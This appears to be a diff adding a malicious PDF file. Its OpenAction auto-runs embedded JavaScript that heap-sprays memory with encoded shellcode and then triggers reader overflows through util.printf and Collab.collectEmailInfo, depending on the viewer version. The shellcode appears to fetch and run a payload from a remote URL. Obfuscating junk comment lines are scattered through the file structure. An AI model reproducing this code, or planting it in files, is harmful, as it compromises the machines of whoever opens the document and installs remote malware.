@@ -1,0 +1,199 @@
+%PDF-1.3
+%PDF477777777777777777777777777776.-3-122.
+%%PDF4777fffffffaaaaa777776.-3-122.
+%%PDF477aas2127fffffffaaaaa777776.-3-122.
+1 0 obj
+<</OpenAction
+<</JS(this.oikja\(\))/S /JavaScript>>
+%PDF47jjjjjjjjjh11111f77fffffffaaaaa777776.-3-122./Threads 2 0 R
+%%PDF4777ff444fffffaaaaa777776.-3-122.
+/Outlines 3 0 R
+/Pages 4 0 R
+/ViewerPreferences <</PageDirection /L2R
+>>
+%PDF46.-3-122.
+%PDF6.-3-1562.
+%
+/PageLayout /SinglePage
+/AcroForm 5 0 R
+/Dests 6 0 R
+/Names 7 0 R
+/Type /Catalog
+>>
+%PDF346.-3-15623452.
+%PDF56776.-3-151162.
+endobj
+2 0 obj
+[]
+endobj
+3 0 obj
+%PDF45656776.-3-151162.
+<</Count 0
+/Type /Outlines
+>>
+%PDF562776.-3-151162.
+%PDF1156776.-3-151162.
+endobj
+4 0 obj
+<</Resources 8 0 R
+/Kids [9 0 R]
+/Count 1
+/Type /Pages
+>>
+%PDF56755576.-3-151162.
+endobj
+5 0 obj
+<</Fields []
+>>
+%%PDF47666666666666677fffffffaaaaa777776.-3-122.
+endobj
+6 0 obj
+<<>>
+%PDF5677611111111111111544455555555678.-113-151162.
+endobj
+7 0 obj
+<</JavaScript 10 0 R
+>>
+%PDF52222222222226775655678.-113-151162.
+%PDF511111111167787655678.-113-151162.
+%
+endobj
+8 0 obj
+<</ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
+>>
+%PDF5673333333333333333333366666767855678.-11893-151162.
+endobj
+9 0 obj
+<</Rotate 0
+/Parent 4 0 R
+/Resources 8 0 R
+/TrimBox [0 0 595.28000 841.89000]
+/MediaBox [0 0 595.28000 841.89000]
+/pdftk_PageNum 1
+/Contents 11 0 R
+/Type /Page
+>>
+%%PDF47555555677777777877fffffffaaaaa777776.-3-122.
+%PDF5161277655678.-113-151162.
+endobj
+10 0 obj
+<</Names [(7777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777777ddddddddBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB) 12 0 R]
+>>
+%PDF567765567111111111111111118.-113-151162.
+endobj
+11 0 obj
+<</Length 31
+>>
+stream
+0 0 595.28000 841.89000 re W n
+endstream
+endobj
+%PDF2222222222222222225677655678.-113-151162.
+%%PDF4777fffffffaaBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBaaa777776.-3-122.
+12 0 obj
+<</JS 13 0 R
+/S /JavaScript
+>>
+%PDF56776556890--78.-177613-151162.
+endobj
+13 0 obj
+<</Filter /FlateDecode
+/Length 1071
+>>
+%PDF51111111111677655678.-113-151162.
+stream
+
+var str5=0;
+var strz=0;
+var strq=0;
+function fix_it(yarsp, len)
+{ 
+	while (yarsp.length*2<len){yarsp += yarsp;} 
+	yarsp = yarsp.substring(0,len/2);
+	return yarsp; 
+}
+		
+	var version = app.viewerVersion;
+		
+if (version > 8) 
+{
+var payload = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u6B2F%u766F%u7573%u6174%u2E70%u6E63%u6E2F%u2F61%u6F6C%u6461%u702E%u7068%u693F%u3D64%u0034");
+var noc="90";			
+nop = unescape("%u0A0A%u0A0A%u0A0A%u0A0A")
+heapblock = nop + payload;
+bigblock = unescape("%u0A0A%u0A0A");
+headersize = 20;
+spray = headersize+heapblock.length;
+while (bigblock.length<spray) bigblock+=bigblock;
+fillblock = bigblock.substring(0, spray);
+block = bigblock.substring(0, bigblock.length-spray);
+while(block.length+spray < 0x40000) block = block+block+fillblock;
+
+mem = new Array();
+for (i=0;i<1400;i++) mem[i] = block + heapblock;
+var num = 12999999999999999999888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888888;
+util.printf("%45000f",num);
+} 
+else 
+{
+var addkk = unescape("%uC033%u8B64%u3040%u0C78%u408B%u8B0C%u1C70%u8BAD%u0858%u09EB%u408B%u8D34%u7C40%u588B%u6A3C%u5A44%uE2D1%uE22B%uEC8B%u4FEB%u525A%uEA83%u8956%u0455%u5756%u738B%u8B3C%u3374%u0378%u56F3%u768B%u0320%u33F3%u49C9%u4150%u33AD%u36FF%uBE0F%u0314%uF238%u0874%uCFC1%u030D%u40FA%uEFEB%u3B58%u75F8%u5EE5%u468B%u0324%u66C3%u0C8B%u8B48%u1C56%uD303%u048B%u038A%u5FC3%u505E%u8DC3%u087D%u5257%u33B8%u8ACA%uE85B%uFFA2%uFFFF%uC032%uF78B%uAEF2%uB84F%u2E65%u7865%u66AB%u6698%uB0AB%u8A6C%u98E0%u6850%u6E6F%u642E%u7568%u6C72%u546D%u8EB8%u0E4E%uFFEC%u0455%u5093%uC033%u5050%u8B56%u0455%uC283%u837F%u31C2%u5052%u36B8%u2F1A%uFF70%u0455%u335B%u57FF%uB856%uFE98%u0E8A%u55FF%u5704%uEFB8%uE0CE%uFF60%u0455%u7468%u7074%u2F3A%u6B2F%u766F%u7573%u6174%u2E70%u6E63%u6E2F%u2F61%u6F6C%u6461%u702E%u7068%u693F%u3D64%u0033");
+			
+	var mem_array = new Array(); 
+	var cc = 0x0c0c0c0c; 
+	var addr = 0x400000;
+	var sc_len = addkk.length * 2;
+	var len = addr - (sc_len+0x38);
+	var yarsp = unescape("%u9090%u9090");
+	yarsp = fix_it(yarsp, len);
+	var count2 = (cc - 0x400000)/addr;
+			
+	for (var count=0;count<count2;count++)
+{ 
+	mem_array[count] = yarsp + addkk;
+}
+	var overflow = unescape("%u0c0c%u0c0c");
+	while(overflow.length < 44952) overflow += overflow;
+	this.collabStore = Collab.collectEmailInfo({subj: "",msg: overflow});
+}		
+
+
+endstream
+endobj
+14 0 obj
+<</Creator (Scribus 1.3.3.12)
+/Title <>
+/Producer (Scribus PDF Library 1.3.3.12)
+/Author <>
+/Keywords <>
+/Trapped /False
+/ModDate (2008312053854)
+/CreationDate (2008312053854)
+>>
+%PDF511111677111111111111655678.-113-151162.
+endobj
+xref
+0 15
+0000000000 65535 f 
+0000000015 00000 n 
+0000000261 00000 n 
+0000000279 00000 n 
+0000000324 00000 n 
+0000000397 00000 n 
+0000000428 00000 n 
+0000000448 00000 n 
+0000000487 00000 n 
+0000000553 00000 n 
+0000000731 00000 n 
+0000000781 00000 n 
+0000000862 00000 n 
+0000000909 00000 n 
+0000004186 00000 n 
+trailer
+<</Info 14 0 R
+/Root 1 0 R
+/Size 15
+>>
+%%PDF555568234677655678.-113-151162.
+startxref
+4374
+%%EOF
